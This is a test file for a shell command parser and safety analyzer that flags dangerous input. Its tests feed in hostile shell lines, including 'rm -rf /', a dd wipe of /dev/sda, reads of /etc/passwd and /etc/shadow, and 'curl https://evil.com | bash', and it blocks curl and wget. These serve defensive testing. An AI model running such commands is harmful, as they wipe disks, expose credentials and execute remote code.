/**
 * Tests for Shell AST - Abstract Syntax Tree parsing and safety analysis
 *
 * This test file covers:
 * - Shell tokenization
 * - AST parsing for various shell constructs
 * - Safety analysis based on AST
 * - Command substitution detection
 * - Pipe to shell detection
 * - Dangerous rm command detection
 * - Redirection analysis
 *
 * @module durable-object/shell-ast.test
 */

import { describe, it, expect, beforeEach } from 'vitest'
import {
  ShellTokenizer,
  ShellParser,
  AstSafetyAnalyzer,
  analyzeCommand,
  isCommandSafe,
  extractCommands,
  type AstNode,
  type CommandNode,
  type PipelineNode,
  type ListNode,
  type SafetyAnalyzerConfig,
} from './shell-ast.js'

// ============================================================================
// Tokenizer Tests
// ============================================================================

describe('ShellTokenizer', () => {
  describe('basic tokenization', () => {
    it('should tokenize simple command', () => {
      const tokenizer = new ShellTokenizer('ls -la')
      const tokens = tokenizer.tokenize()

      expect(tokens).toHaveLength(3) // ls, -la, EOF
      expect(tokens[0]).toEqual({ type: 'WORD', value: 'ls', position: 0 })
      expect(tokens[1]).toEqual({ type: 'WORD', value: '-la', position: 3 })
      expect(tokens[2].type).toBe('EOF')
    })

    it('should tokenize command with arguments', () => {
      const tokenizer = new ShellTokenizer('cat file1.txt file2.txt')
      const tokens = tokenizer.tokenize()

      expect(tokens).toHaveLength(4) // cat, file1.txt, file2.txt, EOF
      expect(tokens[0].value).toBe('cat')
      expect(tokens[1].value).toBe('file1.txt')
      expect(tokens[2].value).toBe('file2.txt')
    })

    it('should tokenize pipes', () => {
      const tokenizer = new ShellTokenizer('cat file | grep pattern')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'PIPE')).toBeDefined()
    })

    it('should tokenize redirections', () => {
      const tokenizer = new ShellTokenizer('echo hello > output.txt')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'GT')).toBeDefined()
    })

    it('should tokenize append redirection', () => {
      const tokenizer = new ShellTokenizer('echo hello >> output.txt')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'GTGT')).toBeDefined()
    })

    it('should tokenize logical operators', () => {
      const tokenizer = new ShellTokenizer('cmd1 && cmd2 || cmd3')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'AND')).toBeDefined()
      expect(tokens.find(t => t.type === 'OR')).toBeDefined()
    })

    it('should tokenize semicolon', () => {
      const tokenizer = new ShellTokenizer('cmd1; cmd2')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'SEMI')).toBeDefined()
    })

    it('should tokenize background operator', () => {
      const tokenizer = new ShellTokenizer('cmd &')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'AMP')).toBeDefined()
    })

    it('should tokenize parentheses', () => {
      const tokenizer = new ShellTokenizer('(cmd1; cmd2)')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'LPAREN')).toBeDefined()
      expect(tokens.find(t => t.type === 'RPAREN')).toBeDefined()
    })
  })

  describe('quoted strings', () => {
    it('should tokenize single-quoted string', () => {
      const tokenizer = new ShellTokenizer("echo 'hello world'")
      const tokens = tokenizer.tokenize()

      expect(tokens[1].value).toBe("'hello world'")
    })

    it('should tokenize double-quoted string', () => {
      const tokenizer = new ShellTokenizer('echo "hello world"')
      const tokens = tokenizer.tokenize()

      expect(tokens[1].value).toBe('"hello world"')
    })

    it('should handle escaped characters', () => {
      const tokenizer = new ShellTokenizer('echo hello\\ world')
      const tokens = tokenizer.tokenize()

      expect(tokens[1].value).toBe('hello world')
    })

    it('should handle quotes within quotes', () => {
      const tokenizer = new ShellTokenizer("echo \"it's fine\"")
      const tokens = tokenizer.tokenize()

      expect(tokens[1].value).toBe("\"it's fine\"")
    })
  })

  describe('assignments', () => {
    it('should tokenize variable assignment', () => {
      const tokenizer = new ShellTokenizer('FOO=bar cmd')
      const tokens = tokenizer.tokenize()

      expect(tokens[0]).toEqual({ type: 'ASSIGNMENT', value: 'FOO=bar', position: 0 })
    })

    it('should not tokenize assignment-like strings in quotes', () => {
      const tokenizer = new ShellTokenizer('echo "FOO=bar"')
      const tokens = tokenizer.tokenize()

      expect(tokens[1].type).toBe('WORD')
    })
  })

  describe('file descriptor redirections', () => {
    it('should tokenize stderr redirection', () => {
      const tokenizer = new ShellTokenizer('cmd 2> error.log')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.value === '2>')).toBeDefined()
    })

    it('should tokenize combined stdout/stderr redirection', () => {
      const tokenizer = new ShellTokenizer('cmd &> all.log')
      const tokens = tokenizer.tokenize()

      expect(tokens.find(t => t.type === 'AMP_GT')).toBeDefined()
    })
  })
})

// ============================================================================
// Parser Tests
// ============================================================================

describe('ShellParser', () => {
  let parser: ShellParser

  beforeEach(() => {
    parser = new ShellParser()
  })

  describe('simple commands', () => {
    it('should parse simple command', () => {
      const ast = parser.parse('ls') as CommandNode

      expect(ast.type).toBe('command')
      expect(ast.name.value).toBe('ls')
      expect(ast.args).toHaveLength(0)
    })

    it('should parse command with arguments', () => {
      const ast = parser.parse('ls -la /app') as CommandNode

      expect(ast.type).toBe('command')
      expect(ast.name.value).toBe('ls')
      expect(ast.args).toHaveLength(2)
      expect(ast.args[0].value).toBe('-la')
      expect(ast.args[1].value).toBe('/app')
    })

    it('should parse command with flags', () => {
      const ast = parser.parse('rm -rf /tmp/test') as CommandNode

      expect(ast.type).toBe('command')
      expect(ast.name.value).toBe('rm')
    })

    it('should return null for empty input', () => {
      const ast = parser.parse('')
      expect(ast).toBeNull()
    })

    it('should return null for whitespace-only input', () => {
      const ast = parser.parse('   ')
      expect(ast).toBeNull()
    })
  })

  describe('redirections', () => {
    it('should parse output redirection', () => {
      const ast = parser.parse('echo hello > output.txt') as CommandNode

      expect(ast.type).toBe('command')
      expect(ast.redirections).toHaveLength(1)
      expect(ast.redirections[0].operator).toBe('>')
      expect(ast.redirections[0].target.value).toBe('output.txt')
    })

    it('should parse append redirection', () => {
      const ast = parser.parse('echo hello >> output.txt') as CommandNode

      expect(ast.redirections[0].operator).toBe('>>')
    })

    it('should parse input redirection', () => {
      const ast = parser.parse('cat < input.txt') as CommandNode

      expect(ast.redirections[0].operator).toBe('<')
      expect(ast.redirections[0].target.value).toBe('input.txt')
    })

    it('should parse stderr redirection', () => {
      const ast = parser.parse('cmd 2> error.log') as CommandNode

      expect(ast.redirections).toHaveLength(1)
      expect(ast.redirections[0].fd).toBe(2)
    })
  })

  describe('pipelines', () => {
    it('should parse simple pipeline', () => {
      const ast = parser.parse('cat file | grep pattern') as PipelineNode

      expect(ast.type).toBe('pipeline')
      expect(ast.commands).toHaveLength(2)
      expect((ast.commands[0] as CommandNode).name.value).toBe('cat')
      expect((ast.commands[1] as CommandNode).name.value).toBe('grep')
    })

    it('should parse multi-stage pipeline', () => {
      const ast = parser.parse('cat file | grep pattern | wc -l') as PipelineNode

      expect(ast.type).toBe('pipeline')
      expect(ast.commands).toHaveLength(3)
    })

    it('should parse negated pipeline', () => {
      const ast = parser.parse('! cmd') as PipelineNode

      expect(ast.type).toBe('pipeline')
      expect(ast.negated).toBe(true)
    })
  })

  describe('lists', () => {
    it('should parse sequential commands', () => {
      const ast = parser.parse('cmd1; cmd2') as ListNode

      expect(ast.type).toBe('list')
      expect(ast.operator).toBe(';')
    })

    it('should parse AND list', () => {
      const ast = parser.parse('cmd1 && cmd2') as ListNode

      expect(ast.type).toBe('list')
      expect(ast.operator).toBe('&&')
    })

    it('should parse OR list', () => {
      const ast = parser.parse('cmd1 || cmd2') as ListNode

      expect(ast.type).toBe('list')
      expect(ast.operator).toBe('||')
    })

    it('should parse background execution', () => {
      const ast = parser.parse('cmd &') as ListNode

      expect(ast.type).toBe('list')
      expect(ast.operator).toBe('&')
    })
  })

  describe('subshells', () => {
    it('should parse subshell', () => {
      const ast = parser.parse('(cmd1; cmd2)')

      expect(ast?.type).toBe('subshell')
    })
  })

  describe('variable expansions', () => {
    it('should detect variable expansion', () => {
      const ast = parser.parse('echo $HOME') as CommandNode

      expect(ast.args[0].expansions).toHaveLength(1)
      expect(ast.args[0].expansions[0].type).toBe('variable')
    })

    it('should detect braced variable expansion', () => {
      const ast = parser.parse('echo ${HOME}') as CommandNode

      expect(ast.args[0].expansions).toHaveLength(1)
      expect(ast.args[0].expansions[0].type).toBe('variable')
    })
  })

  describe('command substitution', () => {
    it('should detect $() command substitution', () => {
      const ast = parser.parse('echo $(whoami)') as CommandNode

      expect(ast.args[0].expansions).toHaveLength(1)
      expect(ast.args[0].expansions[0].type).toBe('command_substitution')
    })

    it('should detect backtick command substitution', () => {
      const ast = parser.parse('echo `whoami`') as CommandNode

      expect(ast.args[0].expansions).toHaveLength(1)
      expect(ast.args[0].expansions[0].type).toBe('command_substitution')
    })
  })

  describe('assignments', () => {
    it('should parse prefix assignments', () => {
      const ast = parser.parse('FOO=bar cmd') as CommandNode

      expect(ast.assignments).toHaveLength(1)
      expect(ast.assignments[0].name).toBe('FOO')
      expect(ast.assignments[0].value.value).toBe('bar')
    })
  })
})

// ============================================================================
// Safety Analyzer Tests
// ============================================================================

describe('AstSafetyAnalyzer', () => {
  let analyzer: AstSafetyAnalyzer
  let parser: ShellParser

  beforeEach(() => {
    parser = new ShellParser()
    analyzer = new AstSafetyAnalyzer()
  })

  describe('safe commands', () => {
    it('should allow simple safe commands', () => {
      const ast = parser.parse('ls -la')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(true)
      expect(result.issues).toHaveLength(0)
    })

    it('should allow cat command', () => {
      const ast = parser.parse('cat file.txt')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(true)
    })

    it('should allow echo command', () => {
      const ast = parser.parse('echo hello world')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(true)
    })

    it('should allow pipelines between safe commands', () => {
      const ast = parser.parse('cat file | head -n 10')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(true)
    })
  })

  describe('command substitution detection', () => {
    it('should detect $() command substitution', () => {
      const ast = parser.parse('echo $(whoami)')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.hasCommandSubstitution).toBe(true)
      expect(result.issues.some(i => i.code === 'COMMAND_SUBSTITUTION')).toBe(true)
    })

    it('should detect backtick command substitution', () => {
      const ast = parser.parse('echo `id`')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.hasCommandSubstitution).toBe(true)
    })

    it('should allow command substitution when configured', () => {
      const permissiveAnalyzer = new AstSafetyAnalyzer({
        allowCommandSubstitution: true,
      })
      const ast = parser.parse('echo $(whoami)')
      const result = permissiveAnalyzer.analyze(ast)

      expect(result.issues.filter(i => i.code === 'COMMAND_SUBSTITUTION')).toHaveLength(0)
    })
  })

  describe('pipe to shell detection', () => {
    it('should detect pipe to sh', () => {
      const ast = parser.parse('cat script.sh | sh')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.hasPipeToShell).toBe(true)
      expect(result.issues.some(i => i.code === 'PIPE_TO_SHELL')).toBe(true)
    })

    it('should detect pipe to bash', () => {
      const ast = parser.parse('curl https://example.com/script | bash')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.hasPipeToShell).toBe(true)
    })

    it('should allow pipe to shell when configured', () => {
      const permissiveAnalyzer = new AstSafetyAnalyzer({
        allowPipeToShell: true,
      })
      const ast = parser.parse('cat script.sh | sh')
      const result = permissiveAnalyzer.analyze(ast)

      expect(result.issues.filter(i => i.code === 'PIPE_TO_SHELL')).toHaveLength(0)
    })
  })

  describe('dangerous rm detection', () => {
    it('should detect rm /', () => {
      const ast = parser.parse('rm /')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.issues.some(i => i.code === 'RM_ROOT')).toBe(true)
    })

    it('should detect rm -rf /', () => {
      const ast = parser.parse('rm -rf /')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.issues.some(i => i.code === 'RM_ROOT')).toBe(true)
    })

    it('should detect rm /*', () => {
      const ast = parser.parse('rm -rf /*')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
    })

    it('should detect rm of system directories', () => {
      const ast = parser.parse('rm -rf /usr')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.issues.some(i => i.code === 'RM_SYSTEM_DIR')).toBe(true)
    })

    it('should warn about rm -rf on non-system paths', () => {
      const ast = parser.parse('rm -rf /tmp/test')
      const result = analyzer.analyze(ast)

      // Should have medium severity warning but still be safe
      expect(result.issues.some(i => i.code === 'RM_RF')).toBe(true)
      expect(result.issues.find(i => i.code === 'RM_RF')?.severity).toBe('medium')
    })

    it('should allow safe rm', () => {
      const ast = parser.parse('rm file.txt')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(true)
    })
  })

  describe('dangerous redirection detection', () => {
    it('should detect writing to /dev/sda', () => {
      const ast = parser.parse('echo data > /dev/sda')
      const result = analyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.hasDangerousRedirection).toBe(true)
    })

    it('should detect writing to block devices', () => {
      const ast = parser.parse('dd if=/dev/zero > /dev/sdb')
      const result = analyzer.analyze(ast)

      expect(result.hasDangerousRedirection).toBe(true)
    })

    it('should allow normal file redirections', () => {
      const ast = parser.parse('echo hello > /tmp/output.txt')
      const result = analyzer.analyze(ast)

      expect(result.hasDangerousRedirection).toBe(false)
    })
  })

  describe('blocked commands', () => {
    it('should block configured commands', () => {
      const restrictedAnalyzer = new AstSafetyAnalyzer({
        blockedCommands: new Set(['curl', 'wget']),
      })

      const ast = parser.parse('curl https://example.com')
      const result = restrictedAnalyzer.analyze(ast)

      expect(result.safe).toBe(false)
      expect(result.issues.some(i => i.code === 'BLOCKED_COMMAND')).toBe(true)
    })
  })

  describe('allowlist mode', () => {
    it('should only allow whitelisted commands', () => {
      const restrictedAnalyzer = new AstSafetyAnalyzer({
        allowedCommands: new Set(['cat', 'ls', 'echo']),
      })

      const safeAst = parser.parse('ls -la')
      const safeResult = restrictedAnalyzer.analyze(safeAst)
      expect(safeResult.safe).toBe(true)

      const unsafeAst = parser.parse('rm file.txt')
      const unsafeResult = restrictedAnalyzer.analyze(unsafeAst)
      expect(unsafeResult.safe).toBe(false)
      expect(unsafeResult.issues.some(i => i.code === 'NOT_ALLOWED')).toBe(true)
    })
  })

  describe('command extraction', () => {
    it('should extract all commands from simple command', () => {
      const ast = parser.parse('ls -la')
      const result = analyzer.analyze(ast)

      expect(result.commands).toContain('ls')
    })

    it('should extract all commands from pipeline', () => {
      const ast = parser.parse('cat file | grep pattern | wc -l')
      const result = analyzer.analyze(ast)

      expect(result.commands).toContain('cat')
      expect(result.commands).toContain('grep')
      expect(result.commands).toContain('wc')
    })

    it('should extract all commands from list', () => {
      const ast = parser.parse('cmd1 && cmd2 || cmd3')
      const result = analyzer.analyze(ast)

      expect(result.commands).toContain('cmd1')
      expect(result.commands).toContain('cmd2')
      expect(result.commands).toContain('cmd3')
    })
  })

  describe('background execution', () => {
    it('should detect background execution by default', () => {
      const ast = parser.parse('cmd &')
      const result = analyzer.analyze(ast)

      expect(result.hasBackgroundExecution).toBe(true)
      // Background execution is allowed by default
      expect(result.safe).toBe(true)
    })

    it('should block background execution when configured', () => {
      const restrictedAnalyzer = new AstSafetyAnalyzer({
        allowBackgroundExecution: false,
      })

      const ast = parser.parse('cmd &')
      const result = restrictedAnalyzer.analyze(ast)

      expect(result.issues.some(i => i.code === 'BACKGROUND_EXEC')).toBe(true)
    })
  })
})

// ============================================================================
// Utility Function Tests
// ============================================================================

describe('Utility Functions', () => {
  describe('analyzeCommand', () => {
    it('should analyze command string directly', () => {
      const result = analyzeCommand('ls -la')

      expect(result.safe).toBe(true)
      expect(result.commands).toContain('ls')
    })

    it('should accept configuration', () => {
      const result = analyzeCommand('curl https://example.com', {
        blockedCommands: new Set(['curl']),
      })

      expect(result.safe).toBe(false)
    })
  })

  describe('isCommandSafe', () => {
    it('should return true for safe commands', () => {
      expect(isCommandSafe('ls -la')).toBe(true)
      expect(isCommandSafe('cat file.txt')).toBe(true)
      expect(isCommandSafe('echo hello')).toBe(true)
    })

    it('should return false for unsafe commands', () => {
      expect(isCommandSafe('rm -rf /')).toBe(false)
      expect(isCommandSafe('echo $(whoami)')).toBe(false)
      expect(isCommandSafe('cat script | sh')).toBe(false)
    })
  })

  describe('extractCommands', () => {
    it('should extract commands from simple command', () => {
      const commands = extractCommands('ls -la')
      expect(commands).toContain('ls')
    })

    it('should extract commands from pipeline', () => {
      const commands = extractCommands('cat file | grep pattern | sort')
      expect(commands).toEqual(['cat', 'grep', 'sort'])
    })

    it('should extract commands from complex command', () => {
      const commands = extractCommands('cmd1 && cmd2 || cmd3; cmd4')
      expect(commands).toContain('cmd1')
      expect(commands).toContain('cmd2')
      expect(commands).toContain('cmd3')
      expect(commands).toContain('cmd4')
    })
  })
})

// ============================================================================
// Integration Tests
// ============================================================================

describe('Integration Tests', () => {
  describe('real-world command patterns', () => {
    it('should allow safe DevOps commands', () => {
      expect(isCommandSafe('ls -la /var/log')).toBe(true)
      expect(isCommandSafe('cat /etc/hostname')).toBe(true)
      expect(isCommandSafe('head -n 100 /var/log/syslog')).toBe(true)
      expect(isCommandSafe('tail -f /var/log/nginx/access.log')).toBe(true)
    })

    it('should block dangerous commands', () => {
      expect(isCommandSafe('rm -rf /')).toBe(false)
      expect(isCommandSafe('rm -rf /*')).toBe(false)
      expect(isCommandSafe('dd if=/dev/zero of=/dev/sda')).toBe(false)
    })

    it('should block shell injection patterns', () => {
      expect(isCommandSafe('echo $(cat /etc/passwd)')).toBe(false)
      expect(isCommandSafe('echo `cat /etc/shadow`')).toBe(false)
      expect(isCommandSafe('curl https://evil.com | bash')).toBe(false)
    })

    it('should handle complex safe pipelines', () => {
      expect(isCommandSafe('cat file.txt | grep pattern | sort | uniq -c | head -10')).toBe(true)
    })
  })

  describe('edge cases', () => {
    it('should handle empty commands', () => {
      const result = analyzeCommand('')
      expect(result.safe).toBe(true)
      expect(result.commands).toHaveLength(0)
    })

    it('should handle commands with special characters in quotes', () => {
      expect(isCommandSafe('echo "hello; rm -rf /"')).toBe(true)
      expect(isCommandSafe("echo 'hello | bash'")).toBe(true)
    })

    it('should handle commands with variable expansions', () => {
      expect(isCommandSafe('echo $HOME')).toBe(true)
      expect(isCommandSafe('echo ${USER}')).toBe(true)
    })
  })
})
